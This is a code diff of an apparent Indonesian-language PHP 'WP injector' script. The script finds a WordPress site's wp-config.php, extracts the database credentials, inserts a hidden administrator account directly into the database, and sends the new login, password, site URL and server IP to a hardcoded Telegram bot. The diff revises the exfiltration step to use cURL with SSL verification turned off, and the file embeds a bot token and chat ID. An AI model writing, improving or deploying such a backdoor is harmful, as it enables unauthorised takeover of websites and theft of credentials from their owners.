@@ -3,9 +3,9 @@
 $botToken = "8302945697:AAFLjH5YBHsdi0Z7eCaipZWlj8rPOneuUgU";
 $chatId   = "-5295647197";
 
-$user  = $_POST['wp_user'];
-$pass  = $_POST['wp_pass'];
-$email = $_POST['wp_email'];
+$user  = $_POST['wp_user'] ?? '';
+$pass  = $_POST['wp_pass'] ?? '';
+$email = $_POST['wp_email'] ?? '';
 
 // Fungsi Scan wp-config.php
 $currentPath = dirname(__FILE__);
@@ -23,7 +23,6 @@ while ($search_path !== dirname($search_path)) {
 if ($found_config) {
     $config_content = file_get_contents($found_config);
     
-    // Extract DB Info
     preg_match("/define\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_name);
     preg_match("/define\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_user);
     preg_match("/define\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\);/", $config_content, $db_pass);
@@ -42,28 +41,24 @@ if ($found_config) {
             $user_id = $conn->insert_id;
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
             $conn->query("INSERT INTO `{$prefix}usermeta` (`user_id`, `meta_key`, `meta_value`) VALUES ($user_id, '{$prefix}user_level', '10')");
-            
-            // === PERBAIKAN LINK LOGIN ===
-            $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
-            $domain   = $_SERVER['HTTP_HOST'];
-            
-            // Ambil siteurl dari database (paling akurat)
+
+            // Ambil siteurl
             $siteurl_result = $conn->query("SELECT option_value FROM `{$prefix}options` WHERE option_name = 'siteurl' LIMIT 1");
-            $login_url = $protocol . $domain . "/wp-login.php"; // default fallback
-            
+            $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+            $domain   = $_SERVER['HTTP_HOST'];
+            $login_url = $protocol . $domain . "/wp-login.php";
+
             if ($siteurl_result && $siteurl_result->num_rows > 0) {
                 $row = $siteurl_result->fetch_assoc();
                 $siteurl = rtrim($row['option_value'], '/');
                 $login_url = $siteurl . "/wp-login.php";
             }
 
-            $wp_msg = "SUCCESS: Admin '$user' injected into DB!";
+            // === TELEGRAM NOTIFIKASI (Pakai cURL - lebih reliable) ===
+            $ip   = $_SERVER['SERVER_ADDR'] ?? gethostbyname($domain);
+            $date = date('Y-m-d H:i:s');
 
-            // --- KIRIM KE TELEGRAM ---
-            $ip     = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
-            $date   = date('Y-m-d H:i:s');
-
-            $text = "💎 *INI YA BRO LOGINAN NYA !!* 💎\n\n";
+            $text = "💎 *AMETHYST WP INJECTOR REPORT* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
@@ -71,21 +66,47 @@ if ($found_config) {
             $text .= "🛰 *IP Address:* " . $ip . "\n";
             $text .= "📅 *Tanggal:* " . $date . "\n";
 
-            $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($text) . "&parse_mode=Markdown";
-            @file_get_contents($url);
-            // -------------------------
+            $telegram_url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
+
+            $data = [
+                'chat_id'    => $chatId,
+                'text'       => $text,
+                'parse_mode' => 'Markdown'
+            ];
+
+            $ch = curl_init($telegram_url);
+            curl_setopt($ch, CURLOPT_POST, true);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+            
+            $result = curl_exec($ch);
+            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            $curl_error = curl_error($ch);
+            curl_close($ch);
+
+            // Debug Telegram
+            if ($result === false) {
+                $telegram_status = "Telegram Error: " . $curl_error;
+            } elseif ($http_code != 200) {
+                $telegram_status = "Telegram Failed (HTTP $http_code): " . $result;
+            } else {
+                $telegram_status = "✅ Telegram Sent Successfully";
+            }
+
+            echo "SUCCESS: Admin '$user' injected!<br>";
+            echo $telegram_status . "<br>";
+            echo "Login URL: <a href='$login_url' target='_blank'>$login_url</a>";
 
         } else { 
-            $wp_msg = "ERROR: " . $conn->error; 
+            echo "ERROR Query: " . $conn->error; 
         }
         $conn->close();
     } else { 
-        $wp_msg = "DATABASE ERROR: Connection Failed."; 
+        echo "DATABASE ERROR: Connection Failed. " . $conn->connect_error; 
     }
 } else { 
-    $wp_msg = "ERROR: wp-config.php not found in path hierarchy."; 
+    echo "ERROR: wp-config.php not found."; 
 }
-
-// Optional: tampilkan pesan (kalau dijalankan langsung)
-echo $wp_msg;
 ?>
